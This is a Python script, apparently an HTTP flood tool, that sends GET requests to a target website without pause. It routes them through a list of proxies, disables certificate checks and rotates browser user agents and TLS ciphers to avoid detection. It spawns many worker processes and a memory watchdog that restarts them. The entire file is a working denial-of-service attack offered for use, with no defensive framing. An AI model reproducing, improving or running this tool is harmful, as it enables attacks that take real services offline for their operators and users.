import os
import sys
import random
import time
import multiprocessing
import urllib.parse
import http.client
import socket
import ssl

if len(sys.argv) < 5:
    print('python flood.py target time rate threads proxyFile')
    sys.exit()

def read_lines(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

def random_int(min_val, max_val):
    return random.randint(min_val, max_val)

def random_element(elements):
    return random.choice(elements)

def rand_str(length):
    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(characters) for _ in range(length))

def ip_spoof():
    return ".".join(str(random_int(0, 255)) for _ in range(4))

args = {
    'target': sys.argv[1],
    'time': int(sys.argv[2]),
    'Rate': int(sys.argv[3]),
    'threads': int(sys.argv[4]),
    'proxyFile': sys.argv[5]
}

sig = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
]
cplist = [
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-SHA",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
]
uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
]

cipper = random.choice(cplist)
siga = random.choice(sig)
uap1 = random.choice(uap)
proxies = read_lines(args['proxyFile'])
parsed_target = urllib.parse.urlparse(args['target'])

MAX_RAM_PERCENTAGE = 100
RESTART_DELAY = 1000

def kill_script():
    sys.exit(1)

def checkram():
    total_ram = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES')
    free_ram = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_AVPHYS_PAGES')
    used_ram = total_ram - free_ram
    ram_percentage = (used_ram / total_ram) * 100

    if ram_percentage >= MAX_RAM_PERCENTAGE:
        print(f'[!] Ram using: {ram_percentage:.2f}%')
        khoidonglai()

def khoidonglai():
    for p in multiprocessing.active_children():
        p.terminate()
    print(f'[>] Khoidonglai script {RESTART_DELAY} ms...')
    time.sleep(RESTART_DELAY / 1000)
    for _ in range(args['threads']):
        p = multiprocessing.Process(target=run_flooder)
        p.start()

def net_socket_http(options, callback):
    addr_host = options['address'].split(":")[0]
    payload = f"CONNECT {options['address']}:443 HTTP/1.1\r\nHost: {options['address']}:443\r\nConnection: Keep-Alive\r\n\r\n"
    buffer = payload.encode('utf-8')

    try:
        connection = socket.create_connection((options['host'], options['port']), timeout=options['timeout'])
        connection.settimeout(options['timeout'])
        connection.sendall(buffer)

        response = connection.recv(4096).decode('utf-8')
        if "HTTP/1.1 200" not in response:
            connection.close()
            return callback(None, "error: invalid response from proxy server")

        return callback(connection, None)
    except Exception as e:
        return callback(None, f"error: {e}")

def run_flooder():
    proxy_addr = random_element(proxies)
    parsed_proxy = proxy_addr.split(":")
    headers = {
        ":method": "GET",
        ":path": parsed_target.path + "?Famod",
        ":scheme": "https",
        ":authority": parsed_target.netloc,
        "user-agent": uap1
    }
    proxy_options = {
        'host': parsed_proxy[0],
        'port': int(parsed_proxy[1]),
        'address': parsed_target.netloc,
        'timeout': 50,
    }

    def http_callback(connection, error):
        if error:
            return

        connection.settimeout(600)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_ciphers(cipper)

        tls_conn = context.wrap_socket(connection, server_hostname=parsed_target.netloc)

        client = http.client.HTTPSConnection(parsed_target.netloc, context=context, timeout=120, source_address=(proxy_options['host'], proxy_options['port']))
        client.sock = tls_conn

        def send_request():
            for _ in range(args['Rate']):
                client.request("GET", parsed_target.path, headers=headers)
                response = client.getresponse()
                response.read()
                response.close()

        while True:
            send_request()

    net_socket_http(proxy_options, http_callback)

if __name__ == '__main__':
    for _ in range(args['threads']):
        p = multiprocessing.Process(target=run_flooder)
        p.start()

    def checkram_interval():
        while True:
            checkram()
            time.sleep(5)

    p = multiprocessing.Process(target=checkram_interval)
    p.start()

    time.sleep(args['time'])
    kill_script()
